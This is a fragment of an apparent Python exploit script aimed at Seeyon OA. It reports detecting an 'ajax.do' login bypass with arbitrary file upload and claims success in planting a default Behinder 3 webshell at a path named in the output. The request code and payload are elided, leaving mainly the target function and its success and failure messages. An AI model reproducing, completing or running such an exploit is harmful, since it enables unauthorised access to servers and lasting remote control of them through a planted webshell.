...
def main(target_url):
    ...
    console.print(now_time() + " [INFO]     正在检测致远OA ajax.do 登录绕过 任意文件上传漏洞", style='bold blue')
        ...
        if response.status_code == 200:
            console.print(
                now_time() + ' [SUCCESS]  成功上传冰蝎三默认webshell: {}seeyon/apps_res/addressbook/images/config.jspx'.format(
                    target_url, target_url), style='bold green')
        else:
            console.print(now_time() + " [WARNING]  目标漏洞无法利用, 写入失败 ", style='bold red')
    except:
        console.print(now_time() + " [WARNING]  目标漏洞无法利用, 写入失败 ", style='bold red')
